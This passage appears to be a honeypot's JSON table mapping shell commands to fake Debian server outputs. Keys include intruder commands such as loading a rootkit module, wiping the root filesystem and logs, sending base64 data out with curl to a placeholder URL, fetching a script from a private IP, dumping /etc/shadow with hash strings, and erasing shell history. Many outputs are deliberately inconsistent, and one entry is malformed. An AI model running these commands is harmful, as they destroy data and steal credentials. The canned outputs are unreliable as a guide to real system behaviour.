{
    "ls -al": "drwx------ 1 root root 4096 2013-04-05 12:25 .\ndrwxr-xr-x 1 root root 4096 2013-04-05 12:03 ..\ndrwx------ 1 root root 4096 2013-04-05 11:58 .aptitude\n-rw-r--r-- 1 root root  570 2013-04-05 11:52 .bashrc\n-rw-r--r-- 1 root root  140 2013-04-05 11:52 .profile\ndrwx------ 1 root root 4096 2013-04-05 12:05 .ssh\n\n",
    "uname -a": "Linux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux\n\n",
    "df -h": "Filesystem                                              Size  Used Avail Use% Mounted on\nrootfs                                                  4.7G  731M  3.8G  17% /\nudev                                                     10M     0   10M   0% /dev\ntmpfs                                                    25M  192K   25M   1% /run\n/dev/disk/by-uuid/65626fdc-e4c5-4539-8745-edc212b9b0af  4.7G  731M  3.8G  17% /\ntmpfs                                                   5.0M     0  5.0M   0% /run/lock\ntmpfs                                                   101M     0  101M   0% /run/shm\n\n",
    "users": "root\n\n",
    "netstat": "Active Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 *:ssh                   *:*                     LISTEN\ntcp6       0      0 [::]:ssh                [::]:*                  LISTEN\nActive UNIX domain sockets (only servers)\nProto RefCnt Flags       Type       State         I-Node   Path\nunix  2      [ ACC ]     STREAM     LISTENING     8969     /var/run/acpid.socket\nunix  2      [ ACC ]     STREAM     LISTENING     6807     @/com/ubuntu/upstart\nunix  2      [ ACC ]     STREAM     LISTENING     7299     /var/run/dbus/system_bus_socket\nunix  2      [ ACC ]     SEQPACKET  LISTENING     7159     /run/udev/control\n\n",
    "groups": "root \n\n",
    "LD_PRELOAD=\"/tmp/wqs.so\" /bin/ls": "\n",
    "sudo insmod rootkit.ko": "sudo: Only one of the -e, -h, -i, -K, -l, -s, -v or -V options may be specified\nusage: sudo [-D level] -h | -K | -k | -V\nusage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]\nusage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]\nusage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]\nusage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...\n\n",
    "useradd \u2013g 500 \u2013u 500 \u2013s /usr/local/bin/nocando \u2013d /var/spool/vmail": "Adding user `\u2013' ...\nAdding new group `\u2013' (1001) ...\nAdding new user `\u2013' (1001) with group `\u2013' ...\nCreating home directory `/home/\u2013' ...\nCopying files from `/etc/skel' ...\nPassword: \n",
    "rm -rf / --no-preserve-rootrm -rf /var/logs": "rm: invalid option -- 'no-preserve-rootnrm'\nTry 'rm --help' for more information\n\n",
    "curl -XPOST #{base64_data}.#{destination_url}": "curl: option -X not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "wget http://192.168.32.7:1337/file.sh": "curl: (6) Could not resolve host: 192.168.32.7\n\n",
    "sudo cat /etc/shadow > file": "root:$6$4aOmWdpJ$/kyPOik9rR0kSLyABIYNXgg/UqlWX3c1eIaovOLWphShTGXmuUAMq6iu9DrcQqlVUw3Pirizns4u27w3Ugvb6.:15800:0:99999:7:::\ndaemon:*:15800:0:99999:7:::\nbin:*:15800:0:99999:7:::\nsys:*:15800:0:99999:7:::\nsync:*:15800:0:99999:7:::\ngames:*:15800:0:99999:7:::\nman:*:15800:0:99999:7:::\nlp:*:15800:0:99999:7:::\nmail:*:15800:0:99999:7:::\nnews:*:15800:0:99999:7:::\nuucp:*:15800:0:99999:7:::\nproxy:*:15800:0:99999:7:::\nwww-data:*:15800:0:99999:7:::\nbackup:*:15800:0:99999:7:::\nlist:*:15800:0:99999:7:::\nirc:*:15800:0:99999:7:::\ngnats:*:15800:0:99999:7:::\nnobody:*:15800:0:99999:7:::\nlibuuid:!:15800:0:99999:7:::\nsshd:*:15800:0:99999:7:::\nphil:$6$ErqInBoz$FibX212AFnHMvyZdWW87bq5Cm3214CoffqFuUyzz.ZKmZ725zKqSPRRlQ1fGGP02V/WawQWQrDda6YiKERNR61:15800:0:99999:7:::\n\n",
    "echo \u201c\" > ~/.bash_history": "-bash: syntax error: unexpected end of file\n\n",
    "pwd": "/root\n\n",
    "cd ..; ls -al": "drwxr-xr-x 1 root root  4096 2013-04-05 12:03 .\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:03 ..\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:53 bin\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:02 boot\ndrwxr-xr-x 1 root root  3060 2013-04-05 12:03 dev\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:06 etc\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:02 home\nlrwxrwxrwx 1 root root    32 2013-04-05 11:53 initrd.img -> /boot/initrd.img-3.2.0-4-686-pae\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:01 lib\ndrwx------ 1 root root 16384 2013-04-05 11:52 lost+found\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 media\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 mnt\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 opt\ndr-xr-xr-x 1 root root     0 2013-04-05 12:03 proc\ndrwx------ 1 root root  4096 2013-04-05 12:25 root\ndrwxr-xr-x 1 root root   380 2013-04-05 12:06 run\ndrwxr-xr-x 1 root root  4096 2013-04-05 12:03 sbin\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 selinux\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 srv\ndrwxr-xr-x 1 root root     0 2013-04-05 12:03 sys\n-rwxr-xr-x 1 root root   500 2021-05-30 04:44 test2\ndrwxrwxrwt 1 root root  4096 2013-04-05 12:17 tmp\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 usr\ndrwxr-xr-x 1 root root  4096 2013-04-05 11:52 var\nlrwxrwxrwx 1 root root    28 2013-04-05 11:53 vmlinuz -> /boot/vmlinuz-3.2.0-4-686-pae\n\n",
    "cp test1.txt test2.txt": "cp: cannot stat `test1.txt': No such file or directory\n\n",
    "mv test1.txt test2.txt": "mv: cannot stat `test1.txt': No such file or directory\n\n",
    "rm test.txt": "rm: cannot remove `test.txt': No such file or directory\n\n",
    "cat test.txt": "cat: test.txt: No such file or directory\n\n",
    "grep \"pattern\" test.txt": "grep: /root/test.txt: No such file or directory\n\n",
    "head test.txt": "head: cannot open `/root/test.txt' for reading: No such file or directory\n\n",
    "tail test.txt": "tail: cannot open `/root/test.txt' for reading: No such file or directory\n\n",
    "nano test.txt": "E558: Terminal entry not found in terminfo\n\n",
    "chmod permissions test.txt": "chmod: invalid mode: \u2018permissions\u2019\nTry 'chmod --help' for more information.\n\n",
    "ps": "PID   TTY     TIME  COMMAND                     \n6271  pts/0   0:00  -bash                        \n6273  pts/0   0:00  ps                           \n\n",
    "top": "E82: Cannot allocate any buffer, exiting...\n\n",
    "ifconfig": "eth0      Link encap:Ethernet  HWaddr 00:1A:92:7A:67:2D  \n          inet addr:192.168.1.2  Bcast:192.168.1.255  Mask:255.255.255.0\n          inet6 addr: fe80::21a:92ff:fe7a:672d/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:123456 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:123456 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:98765432 (98.7 MB)  TX bytes:87654321 (87.6 MB)\n          Interrupt:20 Memory:fa800000-fa820000 \n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:1234 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:1234 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:123456 (123.4 KB)  TX bytes:123456 (123.4 KB)\n"
    "ping google.com": "PING google.com (29.89.32.244) 56(84) bytes of data.\n64 bytes from google.com (29.89.32.244): icmp_seq=1 ttl=50 time=49.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=2 ttl=50 time=41.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=3 ttl=50 time=42.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=4 ttl=50 time=42.9 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=5 ttl=50 time=46.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=6 ttl=50 time=49.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=7 ttl=50 time=48.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=8 ttl=50 time=41.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=9 ttl=50 time=48.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=10 ttl=50 time=40.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=11 ttl=50 time=41.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=12 ttl=50 time=41.2 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=13 ttl=50 time=44.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=14 ttl=50 time=47.2 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=15 ttl=50 time=44.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=16 ttl=50 time=40.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=17 ttl=50 time=48.5 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=18 ttl=50 time=46.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=19 ttl=50 time=41.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=20 ttl=50 time=46.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=21 ttl=50 time=42.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=22 ttl=50 time=49.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=23 ttl=50 time=41.9 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=24 ttl=50 time=40.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=25 ttl=50 time=44.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=26 ttl=50 time=43.2 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=27 ttl=50 time=48.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=28 ttl=50 time=42.9 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=29 ttl=50 time=43.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=30 ttl=50 time=45.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=31 ttl=50 time=49.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=32 ttl=50 time=43.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=33 ttl=50 time=49.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=34 ttl=50 time=48.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=35 ttl=50 time=49.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=36 ttl=50 time=44.2 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=37 ttl=50 time=44.5 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=38 ttl=50 time=49.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=39 ttl=50 time=44.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=40 ttl=50 time=48.2 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=41 ttl=50 time=42.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=42 ttl=50 time=43.1 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=43 ttl=50 time=46.0 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=44 ttl=50 time=43.0 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=45 ttl=50 time=48.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=46 ttl=50 time=44.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=47 ttl=50 time=44.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=48 ttl=50 time=42.8 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=49 ttl=50 time=45.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=50 ttl=50 time=40.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=51 ttl=50 time=44.6 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=52 ttl=50 time=47.5 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=53 ttl=50 time=40.7 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=54 ttl=50 time=46.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=55 ttl=50 time=42.4 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=56 ttl=50 time=47.0 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=57 ttl=50 time=43.5 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=58 ttl=50 time=48.0 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=59 ttl=50 time=48.3 ms\n64 bytes from google.com (29.89.32.244): icmp_seq=60 ttl=50 time=41.5 ms\n\n",
    "ssh user@host": "The authenticity of host 'host (103.179.219.168)'             can't be established.\nRSA key fingerprint is             9d:30:97:8a:9e:48:0d:de:04:8d:76:3a:7b:4b:30:f8.\nAre you sure you want to continue connecting (yes/no)? \n",
    "scp test.txt user@host:/remote/directory": "",
    "wget file_url": "exec request failed on channel 0\n\n",
    "curl url": "curl: (6) Could not resolve host: url\n\n",
    "tar -zxvf archive.tar.gz": "tar: archive.tar.gz: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "unzip test.txt": "unzip:  cannot find or open test.txt, test.txt.zip or test.txt.ZIP.\n\n",
    "date": "Fri Feb 16 16:24:42 UTC 2024\n\n",
    "who": "root     pts/0        2024-02-16 16:24 (192.168.64.1)\n\n",
    "which pwd": "/bin/pwd\n\n",
    "mount /device /mount_point": "/dev/sda1 on / type ext3 (rw,errors=remount-ro)\ntmpfs on /lib/init/rw type tmpfs (rw,nosuid,mode=0755)\nproc on /proc type proc (rw,noexec,nosuid,nodev)\nsysfs on /sys type sysfs (rw,noexec,nosuid,nodev)\nudev on /dev type tmpfs (rw,mode=0755)\ntmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\ndevpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=620)\n\n",
    "awk '/^foo/ {print $2}' /home/phil/file": "awk: /home/phil/file: No such file or directory\n\n",
    "awk -F ',' '{print $NF}' /home/phil/file": "awk: {print $NF}: No such file or directory\nawk: /home/phil/file: No such file or directory\n\n",
    "cat -C /home/phil/filearch": "cat: invalid option -- 'C'\nTry 'cat --help' for more information.\n\n",
    "cat -e /dev/tty": "cat: /dev/tty: No such file or directory\n\n",
    "cat -e /home/phil/file": "cat: /home/phil/file: No such file or directory\n\n",
    "cat -n /etc/hosts": "     1  127.0.0.1\tlocalhost\n     2  127.0.1.1\tnas3\n     3  \n     4  # The following lines are desirable for IPv6 capable hosts\n     5  ::1     localhost ip6-localhost ip6-loopback\n     6  ff02::1 ip6-allnodes\n     7  ff02::2 ip6-allrouters\n\n",
    "cat -n /home/phil/test1.txt /home/phil//test2.txt /home/phil/file3": "cat: /home/phil/test1.txt: No such file or directory\ncat: /home/phil//test2.txt: No such file or directory\ncat: /home/phil/file3: No such file or directory\n\n",
    "cat -u /dev/tty12 > /dev/tty13": "cat: /dev/tty12: No such file or directory\n\n",
    "cat -v /dev/null": "cat: /dev/null: No such file or directory\n\n",
    "cat -z /home/phil/file": "cat: invalid option -- 'z'\nTry 'cat --help' for more information.\n\n",
    "cat /dev/stderr": "cat: /dev/stderr: No such file or directory\n\n",
    "cat /dev/stdin": "cat: /dev/stdin: No such file or directory\n\n",
    "cat /dev/stdout": "cat: /dev/stdout: No such file or directory\n\n",
    "cat /etc/issue": "Debian GNU/Linux 7 \\n \\l\n\n\n",
    "cat /etc/os-release": "cat: /etc/os-release: No such file or directory\n\n",
    "cat /home/phil/test1.txt /home/phil//test2.txt > /home/phil/output.txt": "cat: /home/phil/test1.txt: No such file or directory\ncat: /home/phil//test2.txt: No such file or directory\n\n",
    "cat /proc/cpuinfo": "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 23\nmodel name\t: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz\nstepping\t: 6\ncpu MHz\t\t: 2133.304\ncache size\t: 6144 KB\nphysical id\t: 0\nsiblings\t: 2\ncore id\t\t: 0\ncpu cores\t: 2\napicid\t\t: 0\ninitial apicid\t: 0\nfpu\t\t: yes\nfpu_exception\t: yes\ncpuid level\t: 10\nwp\t\t: yes\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm\nbogomips\t: 4270.03\nclflush size\t: 64\ncache_alignment\t: 64\naddress sizes\t: 36 bits physical, 48 bits virtual\npower management:\n\nprocessor\t: 1\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 23\nmodel name\t: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz\nstepping\t: 6\ncpu MHz\t\t: 2133.304\ncache size\t: 6144 KB\nphysical id\t: 0\nsiblings\t: 2\ncore id\t\t: 1\ncpu cores\t: 2\napicid\t\t: 1\ninitial apicid\t: 1\nfpu\t\t: yes\nfpu_exception\t: yes\ncpuid level\t: 10\nwp\t\t: yes\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm\nbogomips\t: 4266.61\nclflush size\t: 64\ncache_alignment\t: 64\naddress sizes\t: 36 bits physical, 48 bits virtual\npower management:\n\n\n",
    "cat /proc/cpuinfo | grep model | grep name | wc -l": "2\n\n",
    "cat /test2": "\u007fELF\u0002\u0001\u0001",
    "cd -": "bash: cd: OLDPWD not set\n\n",
    "cd /home/phil; ls -al": "drwxr-xr-x 1 phil phil 4096 2013-04-05 12:02 .\ndrwxr-xr-x 1 root root 4096 2013-04-05 12:02 ..\n-rw-r--r-- 1 phil phil  220 2013-04-05 12:02 .bash_logout\n-rw-r--r-- 1 phil phil 3392 2013-04-05 12:02 .bashrc\n-rw-r--r-- 1 phil phil  675 2013-04-05 12:02 .profile\n\n",
    "cd /usr/bin; ls -al": "drwxr-xr-x 1 root root      20480 2013-04-05 12:06 .\ndrwxr-xr-x 1 root root       4096 2013-04-05 11:52 ..\nlrwxrwxrwx 1 root root          8 2013-04-05 12:06 2to3 -> /usr/bin/2to3-2.7\n-rwxr-xr-x 1 root root         96 2013-04-05 12:06 2to3-2.7\n-rwxr-xr-x 1 root root     538900 2013-04-05 12:01 VBoxClient\nlrwxrwxrwx 1 root root          1 2013-04-05 12:00 X11 -> /usr/bin\n-rwxr-xr-x 1 root root    2027892 2013-04-05 12:01 Xorg\n-rwxr-xr-x 1 root root      34356 2013-04-05 11:52 [\n-rwxr-xr-x 1 root root      15652 2013-04-05 11:53 acpi\n-rwxr-xr-x 1 root root       9880 2013-04-05 11:53 acpi_listen\n-rwxr-xr-x 1 root root       5504 2013-04-05 11:52 addpart\n-rwxr-xr-x 1 root root      22672 2013-04-05 12:00 addr2line\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 apropos -> /usr/bin/whatis\n-rwxr-xr-x 1 root root     112600 2013-04-05 11:52 apt-cache\n-rwxr-xr-x 1 root root      22128 2013-04-05 11:52 apt-cdrom\n-rwxr-xr-x 1 root root      18004 2013-04-05 11:52 apt-config\n-rwxr-xr-x 1 root root      22180 2013-04-05 11:52 apt-extracttemplates\n-rwxr-xr-x 1 root root     186536 2013-04-05 11:52 apt-ftparchive\n-rwxr-xr-x 1 root root     194932 2013-04-05 11:52 apt-get\n-rwxr-xr-x 1 root root       7313 2013-04-05 11:52 apt-key\n-rwxr-xr-x 1 root root      46844 2013-04-05 11:52 apt-mark\n-rwxr-xr-x 1 root root      26200 2013-04-05 11:52 apt-sortpkgs\nlrwxrwxrwx 1 root root         26 2013-04-05 11:52 aptitude -> /usr/bin/aptitude-curses\n-rwxr-xr-x 1 root root       1939 2013-04-05 11:52 aptitude-create-state-bundle\n-rwxr-xr-x 1 root root    4397816 2013-04-05 11:52 aptitude-curses\n-rwxr-xr-x 1 root root       2850 2013-04-05 11:52 aptitude-run-state-bundle\n-rwxr-xr-x 1 root root      51316 2013-04-05 12:00 ar\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 arch\n-rwxr-xr-x 1 root root     335176 2013-04-05 12:00 as\nlrwxrwxrwx 1 root root         21 2013-04-05 11:52 awk -> /usr/bin/mawk\n-rwxr-xr-x 1 root root      38468 2013-04-05 11:52 base64\n-rwxr-xr-x 1 root root      30252 2013-04-05 11:52 basename\n-rwxr-xr-x 1 root root       6966 2013-04-05 11:52 bashbug\n-rwxr-xr-x 1 root root       5760 2013-04-05 12:01 bdftopcf\n-rwxr-xr-x 1 root root       6004 2013-04-05 12:01 bdftruncate\n-rwxr-xr-x 1 root root       9640 2013-04-05 11:52 bsd-from\n-rwxr-sr-x 1 root tty        9708 2013-04-05 11:52 bsd-write\n-rwxr-xr-x 1 root root      34592 2013-04-05 12:02 buildhash\n-rwxr-xr-x 1 root root      20092 2013-04-05 12:00 c++filt\nlrwxrwxrwx 1 root root         21 2013-04-05 12:01 c89 -> /usr/bin/c89-gcc\n-rwxr-xr-x 1 root root        428 2013-04-05 12:01 c89-gcc\nlrwxrwxrwx 1 root root         21 2013-04-05 12:01 c99 -> /usr/bin/c99-gcc\n-rwxr-xr-x 1 root root        454 2013-04-05 12:01 c99-gcc\nlrwxrwxrwx 1 root root          4 2013-04-05 11:52 cal -> /usr/bin/ncal\n-rwxr-xr-x 1 root root      26608 2013-04-05 11:52 calendar\nlrwxrwxrwx 1 root root          3 2013-04-05 11:52 captoinfo -> /usr/bin/tic\n-rwxr-xr-x 1 root root       3400 2013-04-05 11:52 catchsegv\n-rwxr-xr-x 1 root root      30268 2013-04-05 11:52 catman\nlrwxrwxrwx 1 root root         20 2013-04-05 12:01 cc -> /usr/bin/gcc-4.7\n-rwxr-sr-x 1 root shadow    49364 2013-04-05 11:52 chage\n-rwxr-xr-x 1 root root       9740 2013-04-05 11:52 chattr\n-rwxr-xr-x 1 root root      63168 2013-04-05 11:52 chcon\n-rwsr-xr-x 1 root root      44564 2013-04-05 11:52 chfn\n-rwxr-xr-x 1 root root       3676 2013-04-05 11:52 chkdupexe\n-rwxr-xr-x 1 root root      17904 2013-04-05 11:52 chrt\n-rwsr-xr-x 1 root root      35892 2013-04-05 11:52 chsh\n-rwxr-xr-x 1 root root     147645 2013-04-05 11:53 ckbcomp\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 cksum\n-rwxr-xr-x 1 root root       5552 2013-04-05 11:52 clear\n-rwxr-xr-x 1 root root       9632 2013-04-05 11:52 clear_console\n-rwxr-xr-x 1 root root      46696 2013-04-05 11:52 cmp\n-rwxr-xr-x 1 root root       9616 2013-04-05 11:53 codepage\n-rwxr-xr-x 1 root root       9636 2013-04-05 11:52 col\n-rwxr-xr-x 1 root root       9620 2013-04-05 11:52 colcrt\n-rwxr-xr-x 1 root root       5520 2013-04-05 11:52 colrm\n-rwxr-xr-x 1 root root       9688 2013-04-05 11:52 column\n-rwxr-xr-x 1 root root      34376 2013-04-05 11:52 comm\nlrwxrwxrwx 1 root root         11 2013-04-05 12:06 compose -> /usr/bin/run-mailcap\nlrwxrwxrwx 1 root root          7 2013-04-05 12:00 cpp -> /usr/bin/cpp-4.7\n-rwxr-xr-x 1 root root     306436 2013-04-05 12:01 cpp-4.6\n-rwxr-xr-x 1 root root     526324 2013-04-05 12:00 cpp-4.7\n-rwxr-sr-x 1 root crontab   34760 2013-04-05 11:52 crontab\n-rwxr-xr-x 1 root root      50832 2013-04-05 11:52 csplit\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 ctstat -> /usr/bin/lnstat\n-rwxr-xr-x 1 root root       4096 2015-05-06 15:09 curl\n-rwxr-xr-x 1 root root      42592 2013-04-05 11:52 cut\n-rwxr-xr-x 1 root root      13796 2013-04-05 12:01 cvt\n-rwxr-xr-x 1 root root       9896 2013-04-05 11:52 ddate\n-rwxr-xr-x 1 root root       9616 2013-04-05 11:53 deallocvt\n-rwxr-xr-x 1 root root       2859 2013-04-05 11:52 debconf\n-rwxr-xr-x 1 root root      11541 2013-04-05 11:52 debconf-apt-progress\n-rwxr-xr-x 1 root root        608 2013-04-05 11:52 debconf-communicate\n-rwxr-xr-x 1 root root       1719 2013-04-05 11:52 debconf-copydb\n-rwxr-xr-x 1 root root        647 2013-04-05 11:52 debconf-escape\n-rwxr-xr-x 1 root root       2978 2013-04-05 11:52 debconf-set-selections\n-rwxr-xr-x 1 root root       1827 2013-04-05 11:52 debconf-show\n-rwxr-xr-x 1 root root       3784 2013-04-05 12:02 defmt-c\n-rwxr-xr-x 1 root root       3600 2013-04-05 12:02 defmt-sh\n-rwxr-xr-x 1 root root       5500 2013-04-05 11:52 delpart\n-rwxr-xr-x 1 root root       4108 2013-04-05 12:01 dh_dkms\n-rwxr-xr-x 1 root root      31211 2013-04-05 12:06 dh_python2\n-rwxr-xr-x 1 root root     116472 2013-04-05 11:52 diff\n-rwxr-xr-x 1 root root      59028 2013-04-05 11:52 diff3\n-rwxr-xr-x 1 root root      38480 2013-04-05 11:52 dircolors\n-rwxr-xr-x 1 root root      30252 2013-04-05 11:52 dirname\n-rwxr-xr-x 1 root root       2904 2013-04-05 11:58 discover-config\n-rwxr-xr-x 1 root root     260208 2013-04-05 11:52 dpkg\n-rwxr-xr-x 1 root root     120848 2013-04-05 11:52 dpkg-deb\n-rwxr-xr-x 1 root root     124912 2013-04-05 11:52 dpkg-divert\n-rwxr-xr-x 1 root root       8048 2013-04-05 11:52 dpkg-maintscript-helper\n-rwxr-xr-x 1 root root     128904 2013-04-05 11:52 dpkg-query\n-rwxr-xr-x 1 root root      59184 2013-04-05 11:52 dpkg-split\n-rwxr-xr-x 1 root root      50936 2013-04-05 11:52 dpkg-statoverride\n-rwxr-xr-x 1 root root      63212 2013-04-05 11:52 dpkg-trigger\n-rwxr-xr-x 1 root root     108284 2013-04-05 11:52 du\nlrwxrwxrwx 1 root root         13 2013-04-05 11:53 dumpkeys -> /bin/dumpkeys\nlrwxrwxrwx 1 root root         11 2013-04-05 12:06 edit -> /usr/bin/run-mailcap\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 editor -> /bin/nano\n-rwxr-xr-x 1 root root      30352 2013-04-05 11:53 eject\n-rwxr-xr-x 1 root root      24132 2013-04-05 12:00 elfedit\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 env\n-rwxr-xr-x 1 root root      30288 2013-04-05 12:02 envsubst\n-rwxr-xr-x 1 root root     136596 2013-04-05 11:52 eqn\nlrwxrwxrwx 1 root root         20 2013-04-05 11:52 ex -> /usr/bin/vim.tiny\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 expand\n-rwxr-sr-x 1 root shadow    18168 2013-04-05 11:52 expiry\n-rwxr-xr-x 1 root root      42572 2013-04-05 11:52 expr\n-rwxr-xr-x 1 root root      34356 2013-04-05 11:52 factor\n-rwxr-xr-x 1 root root      18112 2013-04-05 11:52 faillog\n-rwxr-xr-x 1 root root      18232 2013-04-05 12:01 faked-sysv\n-rwxr-xr-x 1 root root      22344 2013-04-05 12:01 faked-tcp\nlrwxrwxrwx 1 root root         26 2013-04-05 12:01 fakeroot -> /usr/bin/fakeroot-sysv\n-rwxr-xr-x 1 root root       3893 2013-04-05 12:01 fakeroot-sysv\n-rwxr-xr-x 1 root root       3888 2013-04-05 12:01 fakeroot-tcp\n-rwxr-xr-x 1 root root      13760 2013-04-05 11:52 fallocate\n-rwxr-xr-x 1 root root      13796 2013-04-05 12:06 file\n-rwxr-xr-x 1 root root     162424 2013-04-05 11:52 find\n-rwxr-xr-x 1 root root      11985 2013-04-05 12:02 findaffix\n-rwxr-xr-x 1 root root       9672 2013-04-05 11:52 flock\n-rwxr-xr-x 1 root root      34372 2013-04-05 11:52 fmt\n-rwxr-xr-x 1 root root      30276 2013-04-05 11:52 fold\n-rwxr-xr-x 1 root root      31752 2013-04-05 12:01 fonttosfnt\n-rwxr-xr-x 1 root root      13772 2013-04-05 11:52 free\nlrwxrwxrwx 1 root root         22 2013-04-05 11:52 from -> /usr/bin/bsd-from\nlrwxrwxrwx 1 root root          7 2013-04-05 12:01 gcc -> /usr/bin/gcc-4.7\n-rwxr-xr-x 1 root root     306436 2013-04-05 12:01 gcc-4.6\n-rwxr-xr-x 1 root root     525396 2013-04-05 12:00 gcc-4.7\nlrwxrwxrwx 1 root root         10 2013-04-05 12:01 gcc-ar -> /usr/bin/gcc-ar-4.7\n-rwxr-xr-x 1 root root      19448 2013-04-05 12:00 gcc-ar-4.7\nlrwxrwxrwx 1 root root         10 2013-04-05 12:01 gcc-nm -> 